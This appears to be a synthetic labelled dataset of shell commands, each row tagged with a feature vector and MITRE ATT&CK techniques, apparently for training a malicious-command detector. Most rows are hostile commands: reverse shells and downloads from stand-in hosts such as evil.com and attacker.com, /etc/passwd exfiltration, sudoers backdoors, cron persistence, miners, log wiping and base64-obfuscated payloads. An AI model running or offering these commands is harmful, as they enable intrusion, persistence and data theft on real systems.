nohup echo 'YWRkdXNlciAtLXNoZWxsIC9iaW4vYmFzaCAtLWRpc2FibGVkLXBhc3N3b3JkIGJhY2tkb29y' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
nbtscan 192.168.1.0/24 ; > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers | sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
adduser --shell /bin/bash --disabled-password backdoor && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'bmNyYWNrIC1wIDIyIC0tdXNlciByb290IC1QIHBhc3MubHN0IDEwLjAuMC4x' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
find / -writable -type d 2>/dev/null ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup scp file.txt user@host:/tmp/ &,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
sh  -c  'curl  http://evil.com/shell.sh  |  bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0IDsgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
crontab -e | sleep 1,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
find / -writable -type d 2>/dev/null ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
nohup wget -q -O- --header='X-Auth: token123' http://evil.com/cmd && history -c &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
time netstat -tulpn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'dGZ0cCAtaSAxMC4wLjAuOTkgR0VUIHBheWxvYWQuZXhlIEM6XFdpbmRvd3NcVGVtcFxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
journalctl -u ssh --since today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo  'bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnM='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
echo  'compromised  ALL=(ALL)  NOPASSWD:ALL'  >>  /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
"bash -c ""echo 'ZmluZCAvIC1wZXJtIC00MDAwIC10eXBlIGYgMj4vZGV2L251bGwgJiYgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
time ./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
sudo echo 'bG4gLXMgL3RtcC9iYWNrZG9vci5zaCAvZXRjL2Nyb24uZC9zeXN0ZW0tdXBkYXRlICYmID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe && sleep 1,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bm1hcCAtc1YgLXAgMjIsODAsNDQzIDEwLjAuMC4wLzI0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'bHMgLWxhIC9yb290IC9ldGMgL3Zhci93d3c=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'KGNyb250YWIgLWw7IGVjaG8gJyogKiAqICogKiAvdG1wL3BheWxvYWQuc2gnKSB8IGNyb250YWIgLQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIC1vIC90bXAvc2hlbGwuc2g=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
nohup nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded &,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""echo 'bm1jbGkgY29ubmVjdGlvbiBzaG93' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -m -s /bin/bash -G sudo newadmin ; > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1053_Scheduled_Task'],synthetic
shred -u /var/log/auth.log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1070_Indicator_Removal'],synthetic
nohup gcc exploit.c -o exploit && ./exploit &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
time whoami /all,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
ssh -L 8080:internal:80 user@jump.host ; history -c,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmic useraccount list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh && echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo dmesg | head -20,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1082_System_Information_Discovery'],synthetic
$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')) && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'PiB+Ly5iYXNoX2hpc3RvcnkgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nohup cat /etc/passwd | grep -v nologin &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
smbclient  //10.0.0.5/C$  -U  Administrator  ;  chmod  +x  /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIC1vIC90bXAvc2hlbGwuc2g=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
time find / -name '*.pem' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe | > /dev/null 2>&1,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0.2, 0.4, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc  -zv  10.0.0.1  1-1000  2>&1  |  grep  succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
time echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1496_Resource_Hijacking'],synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/ && > /dev/null 2>&1,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'dXNlcm1vZCAtYUcgc3VkbyBjb21wcm9taXNlZF91c2Vy' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
sudo > ~/.bash_history && history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1070_Indicator_Removal'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
"bash -c ""echo 'ZWNobyAnJyA+IC92YXIvbG9nL3N5c2xvZyB8IGhpc3RvcnkgLWM=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJiAmJiBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'ZG1lc2cgfCBoZWFkIC0yMA=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
./dirtycow  /etc/passwd  'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'bm1hcCAtc24gMTkyLjE2OC4xLjAvMjQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'bHNjcHU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
groups,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""echo 'd21pZXhlYy5weSBkb21haW4vYWRtaW46cGFzc0AxMC4wLjAuNSAmJiA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nohup adduser --shell /bin/bash --disabled-password backdoor &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1136_Create_Account'],synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sudo ln -s /tmp/backdoor.sh /etc/cron.d/system-update | sleep 1,"[0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""cat /etc/group""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
ifconfig -a && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
id  -u  |  history  -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
./pwnkit | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cHl0aG9uMyAtYyAiZXhlYyhfX2ltcG9ydF9fKCdiYXNlNjQnKS5iNjRkZWNvZGUoJ2FXMXdiM0owSUc5eicpLmRlY29kZSgpKSI=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
python3 -c 'print(1+1)',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
scp  attacker@10.0.0.99:/tools/linpeas.sh  /tmp/  ;  sleep  1,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"nohup ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)' &","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1087_Account_Discovery'],synthetic
journalctl -u ssh --since today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
"ldapsearch  -x  -b  'dc=domain,dc=com'  '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
nohup ssh admin@localhost &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""perl -e 'use Socket; ...'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time echo 'TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcLi4uJyAtTmFtZSBQZXJzaXN0IC1WYWx1ZSAnQzpccGF5bG9hZC5leGUn' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'bm1hcCAtc1YgLXAgMjIsODAsNDQzIDEwLjAuMC4wLzI0' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time groups && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
echo 'R2V0LUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwIEFkbWluaXN0cmF0b3Jz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh && echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""wmiexec.py domain/admin:pass@10.0.0.5""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
